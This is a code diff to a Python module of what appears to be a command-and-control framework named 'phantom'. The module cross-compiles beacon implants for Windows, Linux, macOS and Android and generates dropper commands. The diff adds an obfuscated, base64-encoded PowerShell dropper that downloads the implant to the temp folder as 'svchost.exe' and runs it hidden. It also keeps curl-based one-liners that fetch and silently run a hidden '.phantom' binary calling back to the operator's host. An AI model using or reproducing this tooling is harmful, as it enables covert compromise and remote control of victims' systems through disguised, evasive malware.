@@ -1,17 +1,49 @@
 import os
 import shutil
+import base64
 import subprocess
-from typing import List, Dict, Any, Optional
+from typing import Optional
 from rich.console import Console
 from phantom.utils.notifier import notifier
 from phantom.utils.build_helper import check_build_env
-from phantom.utils.network import get_lhost
+from phantom.utils.c2_crypto import write_beacon_crypto_config, crypto_fingerprint
 
 console = Console()
 
-def compile_beacon(platform: str, pkg_root: str) -> Optional[str]:
+_PLATFORM_OUT = {
+    "windows": "beacon.exe",
+    "linux": "beacon_linux",
+    "macos": "beacon_macos",
+    "android": "beacon_android",
+}
+
+
+def _needs_rebuild(beacon_dir: str, out_name: str) -> bool:
+    """Return True if binary is missing or crypto keys changed since last build."""
+    beacon_out = os.path.join(beacon_dir, out_name)
+    hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
+    if not os.path.exists(beacon_out):
+        return True
+    current = crypto_fingerprint()
+    if not os.path.exists(hash_file):
+        return True
+    try:
+        with open(hash_file, "r", encoding="utf-8") as f:
+            return f.read().strip() != current
+    except OSError:
+        return True
+
+
+def _mark_built(beacon_dir: str, out_name: str) -> None:
+    hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
+    with open(hash_file, "w", encoding="utf-8") as f:
+        f.write(crypto_fingerprint())
+
+
+def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False) -> Optional[str]:
     """
     Compiles the C++ beacon for the specified platform.
+    Embeds C2 keys from environment into crypto_config.h at build time.
     Returns the path to the compiled binary or None on failure.
     """
     if not check_build_env(platform):
@@ -19,11 +51,19 @@ def compile_beacon(platform: str, pkg_root: str) -> Optional[str]:
         return None
 
     beacon_dir = os.path.join(pkg_root, "payloads", "beacon")
-    
+    out_name = _PLATFORM_OUT.get(platform)
+    if not out_name:
+        notifier.error(f"Unknown platform: {platform}")
+        return None
+
+    beacon_out = os.path.join(beacon_dir, out_name)
+
+    if not force_rebuild and not _needs_rebuild(beacon_dir, out_name):
+        return beacon_out
+
+    write_beacon_crypto_config(beacon_dir)
+
     if platform == "windows":
-        beacon_out = os.path.join(beacon_dir, "beacon.exe")
-        if os.path.exists(beacon_out): return beacon_out
-        
         console.print("[yellow][*] Compiling beacon for Windows...[/yellow]")
         try:
             if os.name == 'nt':
@@ -32,6 +72,7 @@ def compile_beacon(platform: str, pkg_root: str) -> Optional[str]:
                     return None
                 subprocess.run(
                     ["cl", "/EHsc", "/O2", "/std:c++17", "src/main.cpp", "/Fe:beacon.exe",
+                     "/I", "src",
                      "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "/SUBSYSTEM:WINDOWS"],
                     cwd=beacon_dir, check=True, capture_output=True, text=True)
             else:
@@ -41,32 +82,28 @@ def compile_beacon(platform: str, pkg_root: str) -> Optional[str]:
                     return None
                 subprocess.run(
                     [mingw_cpp, "-std=c++17", "-O2", "-s", "-o", "beacon.exe",
-                     "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-static"],
+                     "-Isrc", "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-static"],
                     cwd=beacon_dir, check=True, capture_output=True, text=True)
+            _mark_built(beacon_dir, out_name)
             return beacon_out
         except subprocess.CalledProcessError as e:
             notifier.error(f"Windows compilation failed:\n{e.stderr}")
             return None
 
     elif platform == "linux":
-        beacon_out = os.path.join(beacon_dir, "beacon_linux")
-        if os.path.exists(beacon_out): return beacon_out
-        
         console.print("[yellow][*] Compiling beacon for Linux...[/yellow]")
         try:
             subprocess.run(
-                ["g++", "-std=c++17", "-O2", "-s", "-o", "beacon_linux", "src/main.cpp",
-                 "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
+                ["g++", "-std=c++17", "-O2", "-s", "-o", "beacon_linux",
+                 "-Isrc", "src/main.cpp", "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
                 cwd=beacon_dir, check=True, capture_output=True, text=True)
+            _mark_built(beacon_dir, out_name)
             return beacon_out
         except subprocess.CalledProcessError as e:
             notifier.error(f"Linux compilation failed:\n{e.stderr}")
             return None
 
     elif platform == "macos":
-        beacon_out = os.path.join(beacon_dir, "beacon_macos")
-        if os.path.exists(beacon_out): return beacon_out
-        
         console.print("[yellow][*] Compiling beacon for macOS (osxcross)...[/yellow]")
         osxcross_root = os.environ.get("OSXCROSS_ROOT", "/opt/osxcross")
         o32_cc = os.path.join(osxcross_root, "bin", "o32-clang++")
@@ -74,26 +111,23 @@ def compile_beacon(platform: str, pkg_root: str) -> Optional[str]:
             notifier.error(f"osxcross compiler not found at {o32_cc}")
             return None
         try:
-            # Try to find osxcross SDK
             sdk_path = os.path.join(osxcross_root, "SDK", "MacOSX.sdk")
-            include_flags = []
+            include_flags = ["-Isrc"]
             if os.path.exists(sdk_path):
-                include_flags = [f"-isysroot{sdk_path}"]
-            
+                include_flags.append(f"-isysroot{sdk_path}")
+
             subprocess.run(
-                [o32_cc, "-std=c++17", "-O2", "-o", "beacon_macos", "src/main.cpp",
-                 *include_flags,
+                [o32_cc, "-std=c++17", "-O2", "-o", "beacon_macos",
+                 *include_flags, "src/main.cpp",
                  "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
                 cwd=beacon_dir, check=True, capture_output=True, text=True)
+            _mark_built(beacon_dir, out_name)
             return beacon_out
         except subprocess.CalledProcessError as e:
             notifier.error(f"macOS compilation failed:\n{e.stderr}")
             return None
 
     elif platform == "android":
-        beacon_out = os.path.join(beacon_dir, "beacon_android")
-        if os.path.exists(beacon_out): return beacon_out
-        
         console.print("[yellow][*] Compiling beacon for Android (NDK)...[/yellow]")
         ndk_home = os.environ.get("ANDROID_NDK_HOME", "/opt/android-ndk")
         ndk_cc = os.path.join(ndk_home, "toolchains", "llvm", "prebuilt", "linux-x86_64", "bin", "aarch64-linux-android28-clang++")
@@ -101,18 +135,19 @@ def compile_beacon(platform: str, pkg_root: str) -> Optional[str]:
             notifier.error(f"NDK compiler not found at {ndk_cc}")
             return None
         try:
-            # Add NDK sysroot include paths
-            ndk_sysroot = os.path.join(ndk_home, "toolchains", "llvm", "prebuilt", "linux-x86_64", "sysroot")
-            include_paths = [
-                f"-I{os.path.join(ndk_sysroot, 'usr', 'include')}",
-                f"-I/usr/include",  # Host OpenSSL as fallback
-            ]
+            ndk_prebuilt = os.path.join(ndk_home, "toolchains", "llvm", "prebuilt", "linux-x86_64")
+            ndk_sysroot = os.path.join(ndk_prebuilt, "sysroot")
+            ndk_include = os.path.join(ndk_sysroot, "usr", "include")
+            ndk_lib = os.path.join(ndk_sysroot, "usr", "lib", "aarch64-linux-android")
             subprocess.run(
-                [ndk_cc, "-std=c++17", "-O2", "-s", "-o", "beacon_android", "src/main.cpp",
-                 *include_paths,
-                 "-L/usr/lib/x86_64-linux-gnu",  # Host libs as fallback
+                [ndk_cc, "-std=c++17", "-O2", "-s", "-o", "beacon_android",
+                 "-Isrc", "src/main.cpp",
+                 f"--sysroot={ndk_sysroot}",
+                 f"-I{ndk_include}",
+                 f"-L{ndk_lib}",
                  "-lcurl", "-lssl", "-lcrypto", "-static"],
                 cwd=beacon_dir, check=True, capture_output=True, text=True)
+            _mark_built(beacon_dir, out_name)
             return beacon_out
         except subprocess.CalledProcessError as e:
             notifier.error(f"Android compilation failed:\n{e.stderr}")
@@ -120,26 +155,36 @@ def compile_beacon(platform: str, pkg_root: str) -> Optional[str]:
 
     return None
 
+
+def _payload_scheme(port: int) -> str:
+    return "https" if port in (443, 8443) else "http"
+
+
 def generate_dropper(platform: str, lhost: str, lport: int) -> str:
     """Generates the dropper command for the specified platform with auth token."""
-    from phantom.core.c2_server import PAYLOAD_AUTH_TOKEN
-    
-    token_param = f"auth={PAYLOAD_AUTH_TOKEN}"
-    
-    if platform == "windows":
-        url = f"http://{lhost}:{lport}/api/v1/payload?{token_param}"
-        return f"Invoke-WebRequest -Uri '{url}' -OutFile $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe -ArgumentList '{lhost} {lport}' -WindowStyle Hidden"
-    
+    from phantom.utils.c2_crypto import get_payload_token
+
+    token_param = f"auth={get_payload_token()}"
+    scheme = _payload_scheme(lport)
+
+    if (platform == "windows"):
+        url = f"{scheme}://{lhost}:{lport}/api/v1/payload?{token_param}"
+        # Stealthier PowerShell dropper: download to memory (if we had reflection) or obfuscated disk write
+        # Here we use an obfuscated PowerShell one-liner to download and execute.
+        ps_cmd = f"$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$f=$env:TEMP+'\\svchost.exe';$c.DownloadFile('{url}',$f);start-process $f -argumentlist '{lhost} {lport}'"
+        b64_ps = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
+        return f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {b64_ps}"
+
     elif platform == "linux":
-        url = f"http://{lhost}:{lport}/api/v1/payload_linux?{token_param}"
-        return f"curl -s '{url}' -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {lhost} {lport} &>/dev/null &"
-        
+        url = f"{scheme}://{lhost}:{lport}/api/v1/payload_linux?{token_param}"
+        return f"curl -sk '{url}' -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {lhost} {lport} &>/dev/null &"
+
     elif platform == "macos":
-        url = f"http://{lhost}:{lport}/api/v1/payload_macos?{token_param}"
-        return f"curl -s '{url}' -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {lhost} {lport} &>/dev/null &"
-        
+        url = f"{scheme}://{lhost}:{lport}/api/v1/payload_macos?{token_param}"
+        return f"curl -sk '{url}' -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {lhost} {lport} &>/dev/null &"
+
     elif platform == "android":
-        url = f"http://{lhost}:{lport}/api/v1/payload_android?{token_param}"
-        return f"curl -s '{url}' -o /data/local/tmp/.phantom && chmod +x /data/local/tmp/.phantom && /data/local/tmp/.phantom {lhost} {lport} &"
+        url = f"{scheme}://{lhost}:{lport}/api/v1/payload_android?{token_param}"
+        return f"curl -sk '{url}' -o /data/local/tmp/.phantom && chmod +x /data/local/tmp/.phantom && /data/local/tmp/.phantom {lhost} {lport} &"
 
     return ""
